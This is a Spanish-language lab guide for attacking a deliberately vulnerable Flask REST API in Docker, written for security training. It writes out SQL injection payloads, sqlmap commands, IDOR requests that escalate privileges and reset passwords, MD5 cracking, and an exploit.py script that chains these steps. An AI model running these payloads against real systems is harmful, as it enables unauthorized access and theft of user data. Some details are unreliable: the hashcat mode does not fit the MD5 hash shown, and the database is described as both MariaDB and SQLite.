# Lab 8: REST API Security Testing

**Objetivo**: Entender y explotar vulnerabilidades comunes en APIs REST inseguras. Este laboratorio proporciona una API Flask deliberadamente vulnerable para aprender técnicas de testing de seguridad en APIs.

## 📋 Objetivos de Aprendizaje

1. Identificar y explotar **SQL Injection** en endpoints de API
2. Entender **Insecure Direct Object Reference (IDOR)** y acceso no autorizado
3. Realizar ataques de **escalación de privilegios** en APIs REST
4. Aplicar técnicas de **fuzzing y bruteforce** en autenticación débil
5. Extraer información sensible mediante **Information Disclosure**

## 🔧 Prerrequisitos

- Docker & Docker Compose instalados
- `curl` o **Postman/Insomnia** para testing de API
- `sqlmap` para exploración de SQL injection (en Kali)
- Conocimiento básico de REST APIs y HTTP

## 🏗️ Arquitectura

```
┌─────────────────────────────────────────────────────────┐
│              Lab 8: REST API Security                   │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌────────────────────┐    ┌──────────────────────┐   │
│  │  Flask API         │    │  MariaDB (SQLite)    │   │
│  │  (Vulnerable)      │←──→│  users, products,    │   │
│  │  :5000             │    │  logs                │   │
│  │                    │    │  :3306               │   │
│  │ • SQL Injection    │    └──────────────────────┘   │
│  │ • IDOR             │                               │
│  │ • Weak Auth        │                               │
│  │ • Info Disclosure  │                               │
│  └────────────────────┘                               │
│         ↑                                              │
│    HTTP/REST                                          │
│         ↓                                              │
│  ┌────────────────────────────────────┐              │
│  │  Kali Linux (Attacker)             │              │
│  │  • curl, sqlmap, jq                │              │
│  │  • Burp Suite (optional, from host)│              │
│  │  • Python exploitation scripts      │              │
│  └────────────────────────────────────┘              │
│                                                      │
└─────────────────────────────────────────────────────┘
```

**Red**: `172.18.8.0/24`
- API: `172.18.8.10:5000`
- DB: `172.18.8.20:3306`
- Kali: `172.18.8.30`

## 🚀 Quick Start

### Opción 1: Usar scripts de automatización (Recomendado)

```bash
cd /ruta/a/tu/directorio/Ethical_Hacking/docker-labs/lab8

# Iniciar el lab
./setup.sh

# Verificar estado
./check-lab.sh

# Resetear el lab (eliminar todo)
./reset.sh
```

### Opción 2: Manual con Docker Compose


### 1. Iniciar el laboratorio

```bash
cd docker-labs/lab8
docker compose up -d
docker compose ps
```

### 2. Verificar que los servicios estén saludables

```bash
# Esperar 15-20 segundos para que la API se inicialice
sleep 20

# Verificar API
curl http://localhost:5000/api/health

# Dentro de Kali
docker compose exec kali bash
curl -s http://api:5000/api/health | jq .
```

### 3. Verificar base de datos

```bash
docker compose exec db mysql -uroot -ppassword -e "USE vulnerable_api; SELECT * FROM users;"
```

## 📖 Laboratorio Paso a Paso

### Fase 1: Reconocimiento

**Objetivo**: Enumerar la API y descubrir endpoints vulnerables.

#### Paso 1.1: Descubrir todos los endpoints

```bash
# Desde Kali dentro del contenedor
curl -s http://api:5000/api/health | jq .
```

**Respuesta esperada**:
```json
{
  "status": "healthy",
  "timestamp": "2025-03-06T...",
  "version": "1.0.0",
  "database": "SQLite",
  "debug": true,
  "environment": { ... }
}
```

**🔍 Hallazgo**: El endpoint `/api/health` revela información sensible: modo debug habilitado y variables de entorno.

#### Paso 1.2: Acceso no autenticado a endpoints administrativos

```bash
# Obtener todos los usuarios y sus credenciales sin autenticación
curl -s http://api:5000/api/admin/users | jq .
```

**🔍 Hallazgo crítico**: Acceso sin autenticación a endpoints administrativos que exponen:
- Contraseñas (MD5 hashes)
- API keys
- Roles de usuario

#### Paso 1.3: Acceso a logs sin autenticación

```bash
curl -s http://api:5000/api/admin/logs | jq .
```

**🔍 Hallazgo**: Logs de todas las acciones del sistema sin requerir autenticación.

### Fase 2: Explotación de Autenticación Débil

**Objetivo**: Romper la autenticación e impersonar otros usuarios.

#### Paso 2.1: Descubrir credenciales de prueba

```bash
# Obtener todos los usuarios
curl -s http://api:5000/api/admin/users | jq '.users[] | {username, password}'
```

Credenciales obtenidas (hashes MD5):
- `admin` / `admin123` (MD5: `0192023a7bbd73250516f069df18b500`)
- `user1` / `user1pass`
- `user2` / `user2pass`

#### Paso 2.2: Crackear contraseñas MD5

```bash
# Desde Kali - usar hashcat o john
echo "0192023a7bbd73250516f069df18b500" > /tmp/hash.txt
hashcat -m 500 /tmp/hash.txt /usr/share/wordlists/rockyou.txt

# O usar online: https://md5.gromweb.com/
# Resultado: admin123
```

#### Paso 2.3: Login y obtener token

```bash
# Realizar login
curl -s -X POST http://api:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}' | jq .
```

**Respuesta**:
```json
{
  "success": true,
  "user_id": 1,
  "username": "admin",
  "role": "admin",
  "token": "admin-key-123",
  "message": "Login successful"
}
```

**🔍 Hallazgo**: Token devuelto en plano, sin encriptación.

### Fase 3: SQL Injection

**Objetivo**: Explotar SQL injection en búsqueda de usuarios.

#### Paso 3.1: Inyección SQL básica

```bash
# Autenticarse primero
TOKEN="admin-key-123"

# SQL Injection en búsqueda - listar todos los usuarios
curl -s -X GET "http://api:5000/api/users?search=admin' OR '1'='1" \
  -H "Authorization: Bearer $TOKEN" | jq .
```

#### Paso 3.2: Extraer información de tablas

```bash
# Extraer tabla de logs
curl -s -X GET "http://api:5000/api/users?search=' UNION SELECT id,action,timestamp,details FROM logs -- " \
  -H "Authorization: Bearer $TOKEN" | jq .
```

#### Paso 3.3: Usar sqlmap (desde Kali)

```bash
docker compose exec kali bash

# Instalar sqlmap si no está
apt-get update && apt-get install -y sqlmap

# Ejecutar sqlmap contra el endpoint vulnerable
sqlmap -u "http://api:5000/api/users?search=*" \
  -H "Authorization: Bearer admin-key-123" \
  --dbs \
  --batch
```

**🔍 Hallazgo**: SQL injection permite extraer toda la base de datos.

### Fase 4: Insecure Direct Object Reference (IDOR)

**Objetivo**: Acceder a datos de otros usuarios sin autorización.

#### Paso 4.1: Acceso directo a perfil de usuario

```bash
TOKEN="admin-key-123"

# Acceder a user_id=2 sin ser el propietario
curl -s -X GET http://api:5000/api/users/2 \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**🔍 Hallazgo**: Puedo ver datos de otros usuarios solo cambiando el ID.

#### Paso 4.2: Escalación de privilegios mediante IDOR

```bash
# Cambiar el rol del usuario 2 a admin
curl -s -X PUT http://api:5000/api/users/2 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}' | jq .

# Verificar cambio
curl -s -X GET http://api:5000/api/users/2 \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**🔍 Hallazgo crítico**: Escalación de privilegios - convertir usuario regular en admin.

#### Paso 4.3: Cambiar contraseña de otro usuario

```bash
# Cambiar contraseña del usuario 3
curl -s -X PUT http://api:5000/api/users/3 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password": "hacked123"}' | jq .
```

### Fase 5: Descubrimiento de Información Sensible

**Objetivo**: Extraer información confidencial de la aplicación.

#### Paso 5.1: Acceder a endpoint de debug

```bash
curl -s http://api:5000/api/debug | jq .
```

**🔍 Hallazgo**: Exposición de:
- Configuración de Flask
- Variables de entorno
- Headers HTTP
- **Credenciales hardcodeadas**

#### Paso 5.2: Descargar backup completo

```bash
# Sin autenticación
curl -s http://api:5000/api/backup | jq '.data' > /tmp/api_backup.json

# Verificar contenido
cat /tmp/api_backup.json | jq keys
```

**🔍 Hallazgo crítico**: Acceso sin autenticación a backup completo de base de datos.

#### Paso 5.3: Error-based information disclosure

```bash
# Trigger SQL error para ver estructura
curl -s "http://api:5000/api/search" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"query": "test\x00"}' | jq .
```

**🔍 Hallazgo**: Errores SQL exponen estructura de tablas.

## 🎯 Ejercicios Prácticos

### Ejercicio 1: SQL Injection Avanzada
**Objetivo**: Extraer todos los hashes de contraseña usando UNION-based SQL injection.

**Pasos**:
1. Identificar número de columnas en SELECT
2. Construir payload UNION SELECT
3. Extraer tabla `users` con passwords
4. Documentar query exitosa

**Respuesta esperada**: Todos los hashes MD5 de usuarios extraídos.

---

### Ejercicio 2: Escalación de Privilegios Completa
**Objetivo**: Desde usuario regular, volverse admin y cambiar contraseñas.

**Pasos**:
1. Login como `user1` (obtener token)
2. Explotar IDOR para cambiar propios datos a admin
3. Cambiar contraseña del admin
4. Login como admin con nueva contraseña
5. Documentar toda la cadena de exploits

---

### Ejercicio 3: Automatizar Explotación
**Objetivo**: Crear script Python que automatice todos los ataques.

**Pasos**:
1. Crear script que ejecute todos los payloads de SQL injection
2. Extraer y crackear contraseñas
3. Escalar a admin
4. Descargar backup completo
5. Generar reporte

**Archivo**: `exploit.py`
```python
#!/usr/bin/env python3
import requests
import hashlib
import json
from urllib.parse import quote

API_URL = "http://localhost:5000/api"

def login(username, password):
    """Login y obtener token"""
    resp = requests.post(f"{API_URL}/login", json={
        "username": username,
        "password": password
    })
    if resp.status_code == 200:
        return resp.json()['token']
    return None

def sql_inject(search_query, token):
    """Ejecutar SQL injection"""
    headers = {"Authorization": f"Bearer {token}"}
    resp = requests.get(f"{API_URL}/users?search={quote(search_query)}", headers=headers)
    return resp.json()

# Ejecutar exploits
token = login("admin", "admin123")
print(f"[+] Token: {token}")

# SQL Injection
payload = "admin' OR '1'='1"
results = sql_inject(payload, token)
print(f"[+] SQL Injection results: {results['count']} users found")

# IDOR - escalación
print("[+] Attempting IDOR privilege escalation...")
resp = requests.put(f"{API_URL}/users/2", 
    headers={"Authorization": f"Bearer {token}"},
    json={"role": "admin"})
print(f"[+] Status: {resp.status_code}")

# Backup
resp = requests.get(f"{API_URL}/backup")
backup = resp.json()
print(f"[+] Backup obtained - tables: {list(backup['data'].keys())}")
```

---

### Ejercicio 4: Crear Scanner de Vulnerabilidades API
**Objetivo**: Desarrollar herramienta que identifique automáticamente vulnerabilidades comunes en APIs.

**Pasos**:
1. Realizar fuzzing de endpoints
2. Detectar falta de autenticación
3. Probar inyecciones SQL
4. Verificar IDOR
5. Generar reporte

---

### Ejercicio 5: Escribir Reporte de Seguridad Profesional
**Objetivo**: Documentar todas las vulnerabilidades encontradas en formato profesional.

**Estructura**:
- **Executive Summary**: Resumen ejecutivo con riesgo crítico
- **Vulnerabilidades Encontradas**: Listado con CVSS scores
- **Proof of Concept**: Screenshots de cada exploit
- **Recomendaciones**: Cómo corregir cada vulnerabilidad
- **Timeline**: Cuándo se reportó y corrigió

## 🐛 Troubleshooting

| Problema | Solución |
|----------|----------|
| **API no responde** | `docker compose logs api` - esperar 20s, revisar logs |
| **Conexión rechazada a DB** | `docker compose exec db mysql -uroot -ppassword` |
| **SQL errors en búsqueda** | Error intencional - significa SQL injection funciona |
| **Token inválido** | Obtener nuevo token con `/api/login` |
| **401 Unauthorized** | Agregar header: `Authorization: Bearer <token>` |
| **CORS errors** | Esperado - API REST sin CORS configurado |

## 📊 Checklist de Testing

- [ ] Acceso a `/api/health` revela información sensible
- [ ] Acceso a `/api/admin/users` sin autenticación
- [ ] Acceso a `/api/admin/logs` sin autenticación
- [ ] Acceso a `/api/backup` sin autenticación
- [ ] Acceso a `/api/debug` revela credenciales
- [ ] SQL injection en `/api/users?search=`
- [ ] SQL injection en `/api/search` (POST)
- [ ] IDOR en `/api/users/<id>` GET
- [ ] IDOR en `/api/users/<id>` PUT (cambiar datos)
- [ ] Escalación de privilegios mediante IDOR
- [ ] Crack de contraseñas MD5
- [ ] Información disclosure en 404/500
- [ ] Contraseñas en respuesta de login

## 🔐 Recursos Educativos

- [OWASP API Security](https://owasp.org/www-project-api-security/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Insecure Direct Object References](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- [API Security Best Practices](https://blog.bitsrc.io/api-security-best-practices-ab10cad88326)

## 🧹 Cleanup

```bash
# Detener todos los servicios
docker compose down

# Remover volúmenes (base de datos)
docker compose down -v

# Verificar
docker compose ps
```

## 📝 Notas Importantes

⚠️ **Este laboratorio es únicamente para fines educativos** en un entorno aislado. Las vulnerabilidades implementadas son intencionales para aprendizaje.

✅ **Técnicas aprendidas aquí**:
- Identificación de endpoints administrativos no protegidos
- Explotación de IDOR para escalación de privilegios
- SQL injection en parámetros de búsqueda
- Cracking de hashes débiles (MD5)
- Information disclosure a través de mensajes de error
- Testing manual y automatizado de APIs

---

**Creado**: 2025-03-06  
**Versión**: 1.0  
**Dificultad**: ⭐⭐⭐ (Intermedio)
